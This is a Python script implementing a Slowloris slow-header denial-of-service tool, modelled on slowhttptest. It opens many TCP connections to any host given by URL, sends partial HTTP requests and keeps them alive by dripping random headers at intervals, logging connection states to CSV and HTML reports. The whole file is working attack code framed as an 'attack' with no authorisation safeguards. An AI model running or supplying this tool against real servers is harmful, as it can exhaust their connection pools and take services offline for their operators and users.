import socket
import threading
import time
import random
import sys
import argparse
import csv
import os
from urllib.parse import urlparse

class SlowHTTPTest:
    def __init__(self, target, port=80, num_connections=50, interval=10, 
                 timeout=5, rate=50, output_prefix="slowhttp", 
                 max_length=32, http_method="GET", verbose=False, 
                 generate_stats=False):
        self.target = target
        self.port = port
        self.num_connections = num_connections
        self.interval = interval
        self.timeout = timeout
        self.rate = rate
        self.output_prefix = output_prefix
        self.max_length = max_length
        self.http_method = http_method
        self.verbose = verbose
        self.generate_stats = generate_stats
        self.connections = []
        self.running = False
        self.start_time = 0
        self.stats = {
            'connections_initialized': 0,
            'connections_connected': 0,
            'connections_error': 0,
            'connections_closed': 0,
            'bytes_sent': 0,
            'bytes_received': 0,
            'state_changes': []
        }
        
        # Initialize output files if requested by user
        if self.generate_stats:
            self.setup_output_files()
    
    def setup_output_files(self):
        """Initialize output files for statistics"""
        self.csv_file = open(f"{self.output_prefix}.csv", 'w', newline='')
        self.csv_writer = csv.writer(self.csv_file)
        # Write column headers
        self.csv_writer.writerow([
            'Timestamp', 'Connection_ID', 'State', 'Bytes_Sent', 'Bytes_Received'
        ])
        
        self.html_file = open(f"{self.output_prefix}.html", 'w')
        self.html_file.write("""
        <html>
        <head>
            <title>SlowHTTPTest Report</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; }
                table { border-collapse: collapse; width: 100%; }
                th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
                th { background-color: #f2f2f2; }
                tr:nth-child(even) { background-color: #f9f9f9; }
            </style>
        </head>
        <body>
            <h1>SlowHTTPTest Report</h1>
            <table>
                <tr>
                    <th>Timestamp</th>
                    <th>Connection ID</th>
                    <th>State</th>
                    <th>Bytes Sent</th>
                    <th>Bytes Received</th>
                </tr>
        """)
    
    def log_state_change(self, conn_id, state, bytes_sent=0, bytes_received=0):
        """Log connection state change to output files"""
        if not self.generate_stats:
            return
            
        timestamp = time.time() - self.start_time
        self.stats['state_changes'].append({
            'timestamp': timestamp,
            'conn_id': conn_id,
            'state': state,
            'bytes_sent': bytes_sent,
            'bytes_received': bytes_received
        })
        
        # Log to CSV
        self.csv_writer.writerow([
            timestamp, conn_id, state, bytes_sent, bytes_received
        ])
        
        # Log to HTML
        self.html_file.write(f"""
                <tr>
                    <td>{timestamp:.2f}</td>
                    <td>{conn_id}</td>
                    <td>{state}</td>
                    <td>{bytes_sent}</td>
                    <td>{bytes_received}</td>
                </tr>
        """)
    
    def close_output_files(self):
        """Properly close output files"""
        if self.generate_stats:
            self.html_file.write("""
            </table>
            </body>
            </html>
            """)
            self.html_file.close()
            self.csv_file.close()
    
    def generate_random_string(self, length):
        """Generate a random string of specified length"""
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        return ''.join(random.choice(chars) for _ in range(length))
    
    def create_socket(self, conn_id):
        """Create a new socket and connect to target"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target, self.port))
            self.log_state_change(conn_id, "CONNECTED")
            return s
        except Exception as e:
            if self.verbose:
                print(f"Failed to create connection {conn_id}: {e}")
            self.stats['connections_error'] += 1
            self.log_state_change(conn_id, "ERROR", 0, 0)
            return None

    def slowloris_attack(self, sock, conn_id):
        """Execute Slowloris attack (slow headers)"""
        try:
            # Create random headers
            random_header_name = self.generate_random_string(random.randint(1, self.max_length))
            random_header_value = self.generate_random_string(random.randint(1, self.max_length))
            
            # Send partial HTTP request
            partial_request = (f"{self.http_method} / HTTP/1.1\r\n"
                             f"Host: {self.target}\r\n"
                             f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                             f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                             f"Connection: keep-alive\r\n"
                             f"{random_header_name}: {random_header_value}\r\n")
            
            bytes_sent = sock.send(partial_request.encode())
            self.stats['bytes_sent'] += bytes_sent
            self.log_state_change(conn_id, "HEADER_SENT", bytes_sent, 0)
            
            # Send additional headers slowly
            start_time = time.time()
            while self.running:
                random_header_name = self.generate_random_string(random.randint(1, self.max_length))
                random_header_value = self.generate_random_string(random.randint(1, self.max_length))
                header = f"{random_header_name}: {random_header_value}\r\n"
                
                bytes_sent = sock.send(header.encode())
                self.stats['bytes_sent'] += bytes_sent
                self.log_state_change(conn_id, "HEADER_SENT", bytes_sent, 0)
                
                time.sleep(self.interval)
                
        except Exception as e:
            if self.verbose:
                print(f"Error in attack {conn_id}: {e}")
            self.stats['connections_error'] += 1
            self.log_state_change(conn_id, "ERROR", 0, 0)
            return False
        return True

    def attack(self):
        """Start the attack"""
        print(f"Starting attack on {self.target}:{self.port}")
        print(f"Method: Slowloris, Connections: {self.num_connections}, Rate: {self.rate}/sec")
        self.running = True
        self.start_time = time.time()
        
        # Calculate interval between connection creation based on requested rate
        connection_interval = 1.0 / self.rate if self.rate > 0 else 0
        
        # Create connections at the specified rate
        for i in range(self.num_connections):
            if not self.running:
                break
                
            sock = self.create_socket(i)
            if sock:
                self.connections.append(sock)
                self.stats['connections_initialized'] += 1
                
                # Start separate attack thread for each connection
                t = threading.Thread(target=self.slowloris_attack, args=(sock, i))
                t.daemon = True
                t.start()
            
            # Wait before creating next connection to maintain requested rate
            time.sleep(connection_interval)
        
        print(f"Created {len(self.connections)} connections. Attack in progress...")
        
        # Stay in loop until attack is stopped
        try:
            while self.running:
                # Update statistics
                connected = 0
                for sock in self.connections:
                    try:
                        sock.send(b"")  # Test connection
                        connected += 1
                    except:
                        pass
                
                self.stats['connections_connected'] = connected
                
                if self.verbose:
                    print(f"Active connections: {connected}/{self.num_connections}")
                
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()
        
        # End attack
        self.stop()
    
    def stop(self):
        """Stop attack and close all connections"""
        print("Stopping attack and closing all connections...")
        self.running = False
        
        for i, sock in enumerate(self.connections):
            try:
                sock.close()
                self.log_state_change(i, "CLOSED")
            except:
                pass
        
        # Record final statistics
        self.close_output_files()
        
        print("Attack stopped")
        print(f"Final statistics:")
        print(f"  - Connections initialized: {self.stats['connections_initialized']}")
        print(f"  - Active connections: {self.stats['connections_connected']}")
        print(f"  - Errors: {self.stats['connections_error']}")
        print(f"  - Bytes sent: {self.stats['bytes_sent']}")
        
        if self.generate_stats:
            print(f"  - Statistics saved to: {self.output_prefix}.csv and {self.output_prefix}.html")

def main():
    parser = argparse.ArgumentParser(description="Slow HTTP Attack Tool (Similar to slowhttptest)")
    parser.add_argument("-H", action="store_true", help="Use Slowloris attack (slow headers)")
    parser.add_argument("-c", "--connections", type=int, default=50, help="Target number of connections (default: 50)")
    parser.add_argument("-g", action="store_true", help="Generate statistics with socket state changes")
    parser.add_argument("-o", "--output", default="slowhttp", help="Output file prefix (default: slowhttp)")
    parser.add_argument("-i", "--interval", type=int, default=10, help="Interval between followup data in seconds (default: 10)")
    parser.add_argument("-t", "--verb", default="GET", help="HTTP verb to use in request (default: GET)")
    parser.add_argument("-r", "--rate", type=int, default=50, help="Connections per second (default: 50)")
    parser.add_argument("-u", "--url", required=True, help="Absolute URL of target (e.g., http://localhost/)")
    parser.add_argument("-x", "--max-length", type=int, default=32, help="Max length of randomized name/value pairs (default: 32)")
    parser.add_argument("-p", "--timeout", type=int, default=5, help="Timeout to wait for HTTP response in seconds (default: 5)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose mode")
    
    args = parser.parse_args()
    
    # Extract target information from URL
    parsed_url = urlparse(args.url)
    target = parsed_url.hostname
    port = parsed_url.port or 80
    
    # Create and run attack
    attack = SlowHTTPTest(
        target=target,
        port=port,
        num_connections=args.connections,
        interval=args.interval,
        timeout=args.timeout,
        rate=args.rate,
        output_prefix=args.output,
        max_length=args.max_length,
        http_method=args.verb,
        verbose=args.verbose,
        generate_stats=args.g
    )
    
    try:
        attack.attack()
    except KeyboardInterrupt:
        attack.stop()

if __name__ == "__main__":
    main()